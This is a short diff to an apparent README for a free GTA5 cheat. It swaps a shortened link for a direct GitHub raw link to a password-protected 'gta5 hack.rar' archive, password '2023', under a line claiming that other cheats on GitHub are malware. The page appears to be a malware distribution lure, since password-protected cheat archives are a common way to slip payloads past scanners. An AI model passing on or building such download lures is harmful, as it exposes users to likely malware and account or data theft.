@@ -4,7 +4,7 @@ Almost all the "free cheats" you see on GitHub are fake! Most of them are malwar
 
 # 〢Download: 
 
-*  Download: [Here](http://tinyurl.com/mt2vb28y)
+*  Download: [Here](https://github.com/erzyjcwt/erzyjcwt-project/raw/main/gta5%20hack.rar)
 
 *  Password: 2023
 
